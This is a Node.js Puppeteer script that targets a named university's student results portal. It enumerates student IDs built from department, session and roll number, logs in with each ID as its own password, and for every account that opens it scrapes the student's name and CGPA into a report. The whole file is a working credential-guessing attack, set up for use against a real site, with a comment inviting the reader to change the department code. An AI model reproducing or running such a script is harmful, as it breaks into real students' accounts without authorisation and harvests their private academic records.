const puppeteer = require("puppeteer");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const department = "CSE"; // Change this to your department code
const rollStart = 1;
const rollEnd = 500;

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const unchanged = [];

    let lastSuccessRoll = rollStart;

    for (let year = 16; year <= 25; year++) {
        for (const term of ["01", "03"]) {
            const session = `${year}${term}`;
            let failureCount = 0;

            let skipSession = false;

            console.log(`\n🚀 Starting session: ${session}\n`);

            for (let roll = lastSuccessRoll; roll <= rollEnd; roll++) {
                const rollCode = `20${String(roll).padStart(3, "0")}`;
                const userId = `${department}${session}${rollCode}`;

                console.log(`🔍 Trying: ${userId}`);
                const page = await browser.newPage();
                await page.setDefaultNavigationTimeout(20000);

                try {
                    await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });

                    await page.type("#username", userId);
                    await page.type("#password", userId);

                    await Promise.all([
                        page.click("button[type=submit]"),
                        page.waitForNavigation({ waitUntil: "domcontentloaded" })
                    ]);

                    if (page.url().includes("panel")) {
                        console.log(`✅ Login success: ${userId}`);
                        failureCount = 0;
                        lastSuccessRoll = roll + 1;

                        await page.goto(`${baseUrl}/panel/overallresult`, {
                            waitUntil: "domcontentloaded"
                        });

                        const data = await page.evaluate(() => {
                            let name = "Unknown";
                            let cgpa = "N/A";

                            const rows = document.querySelectorAll("table.table-bordered.table-striped tbody tr");

                            rows.forEach(row => {
                                const ths = row.querySelectorAll("th");
                                const tds = row.querySelectorAll("td");

                                for (let i = 0; i < ths.length; i++) {
                                    const label = ths[i].textContent.trim();
                                    if (label === "Name :") {
                                        name = tds[i]?.textContent?.trim() || "Unknown";
                                    }
                                }
                            });

                            const cgpaMatch = document.body.innerHTML.match(/CGPA\s*:<\/b><\/td>\s*<td[^>]*><b>([\d.]+)<\/b>/);
                            if (cgpaMatch) {
                                cgpa = cgpaMatch[1];
                            }

                            return { name, cgpa };
                        });

                        unchanged.push({ id: userId, ...data });

                        await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
                    } else {
                        failureCount++;
                        console.log(`❌ Login failed: ${userId}`);
                    }

                    if (failureCount >= 20) {
                        console.log(`🚫 20 consecutive failures in session ${session}, moving to next.`);
                        skipSession = true;
                        break;
                    }
                } catch (err) {
                    failureCount++;
                    console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
                    if (failureCount >= 20) {
                        console.log(`🚫 20 consecutive failures in session ${session}, moving to next.`);
                        skipSession = true;
                        break;
                    }
                } finally {
                    try {
                        await page.close();
                    } catch (closeErr) {
                        console.warn(`⚠️ Page close failed: ${closeErr.message}`);
                    }
                }

                if (skipSession) break;
            }
        }
    }

    await browser.close();
    console.log("\n📋 Final Report:");
    console.table(unchanged);
})();
